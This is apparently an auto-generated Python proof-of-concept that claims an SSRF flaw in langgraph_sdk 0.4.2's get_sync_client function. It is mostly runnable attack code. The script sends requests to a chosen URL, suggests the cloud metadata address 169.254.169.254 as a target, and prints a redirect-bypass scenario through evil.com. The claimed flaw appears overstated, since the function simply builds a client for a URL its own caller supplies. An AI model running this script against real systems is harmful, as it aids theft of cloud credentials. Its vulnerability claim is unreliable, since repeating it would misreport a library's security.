#!/usr/bin/env python3
# PoC for langgraph_sdk-0.4.2 (/tmp/langgraph_sdk-0.4.2)
# Path: ssrf-004
# Sink: get_sync_client
# Auto-generated — run with: python3 ssrf_url_httpx_get_sync_client_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via get_sync_client in langgraph_sdk-0.4.2

This script demonstrates that the `get_sync_client` function accepts an arbitrary
URL without validation, allowing an attacker to make requests to internal services
or cloud metadata endpoints.

Vulnerability: The `url` parameter is passed directly to `httpx.Client(base_url=url)`
without any sanitization. httpx follows redirects by default, enabling SSRF bypass.

Usage:
    python3 poc_ssrf.py [target_url]

    If no target_url is provided, defaults to http://127.0.0.1:8080 (local test).
    For cloud metadata testing, use: http://169.254.169.254/latest/meta-data/

Requirements:
    - Python 3.7+
    - httpx (installed as part of langgraph_sdk dependencies)
"""

import sys
import httpx
from langgraph_sdk import get_sync_client


def exploit_ssrf(target_url: str) -> None:
    """
    Attempt SSRF by creating a sync client with a malicious URL.
    
    The function will:
    1. Create a client pointing to the attacker-controlled URL
    2. Attempt to make a request (which may reach internal services)
    3. Report the result
    
    Args:
        target_url: The URL to target (e.g., internal service or metadata endpoint)
    """
    print(f"[*] Attempting SSRF to: {target_url}")
    print("[*] Creating malicious sync client...")
    
    try:
        # Create the client with the attacker-controlled URL
        # This is the vulnerable call - no validation on 'url'
        client = get_sync_client(url=target_url)
        
        print("[+] Client created successfully!")
        print("[*] Attempting to make a request to the target...")
        
        # Make a simple GET request to trigger the SSRF
        # The client will use the base_url we provided
        response = client.get("/")
        
        print(f"[+] Request completed!")
        print(f"[+] Status code: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        
        # Check if we got a response from an internal service
        if response.status_code < 400:
            print("\n[!] SUCCESS: Received valid response from target!")
            print("[!] This confirms SSRF is possible - the client made a request")
            print("[!] to the attacker-controlled URL without validation.")
        else:
            print(f"\n[*] Received HTTP {response.status_code} - target may be")
            print("[*] rejecting the request, but SSRF still occurred.")
            
    except httpx.ConnectError as e:
        print(f"[-] Connection error: {e}")
        print("[*] This is expected if the target service is not running.")
        print("[*] The SSRF attempt was still made (connection was attempted).")
    except httpx.TimeoutException as e:
        print(f"[-] Timeout: {e}")
        print("[*] Target may be slow or unreachable, but SSRF was attempted.")
    except Exception as e:
        print(f"[-] Unexpected error: {type(e).__name__}: {e}")
        print("[*] The SSRF attempt may have partially succeeded.")


def demonstrate_redirect_bypass() -> None:
    """
    Demonstrate that httpx follows redirects by default, enabling SSRF bypass.
    
    This creates a simple scenario where an external attacker server redirects
    to an internal IP, and the client follows the redirect.
    """
    print("\n" + "="*60)
    print("[*] Demonstrating redirect-based SSRF bypass")
    print("[*] httpx follows redirects by default (allow_redirects=True)")
    print("[*] An attacker can host a server that redirects to internal IPs")
    print("="*60)
    
    # Note: This is a conceptual demonstration
    # In a real attack, the attacker would control a server that returns
    # a 302 redirect to http://169.254.169.254/latest/meta-data/
    print("\n[!] Attack scenario:")
    print("    1. Attacker hosts server at https://evil.com")
    print("    2. Server returns 302 redirect to http://169.254.169.254/")
    print("    3. Client follows redirect and accesses cloud metadata")
    print("    4. No re-validation of the redirect target occurs")
    print("\n[*] This bypasses any host-based allowlisting on the initial URL.")


def main():
    """Main entry point with configurable target."""
    # Default to a benign internal target for safe testing
    default_target = "http://127.0.0.1:8080"
    
    # Allow command-line override
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = default_target
        print(f"[*] No target specified, using default: {target}")
        print("[*] To test cloud metadata, run:")
        print(f"    python3 {sys.argv[0]} http://169.254.169.254/latest/meta-data/")
    
    print("="*60)
    print("langgraph_sdk SSRF Proof-of-Concept")
    print("="*60)
    print(f"\n[*] Target URL: {target}")
    print("[*] This PoC demonstrates that get_sync_client accepts arbitrary URLs")
    print("[*] without validation, enabling Server-Side Request Forgery (SSRF).")
    print()
    
    # Run the exploit
    exploit_ssrf(target)
    
    # Show redirect bypass info
    demonstrate_redirect_bypass()
    
    print("\n" + "="*60)
    print("[*] PoC complete.")
    print("[*] To fix: validate and sanitize the URL parameter,")
    print("[*] implement IP allowlisting, and disable redirect following.")
    print("="*60)


if __name__ == "__main__":
    main()
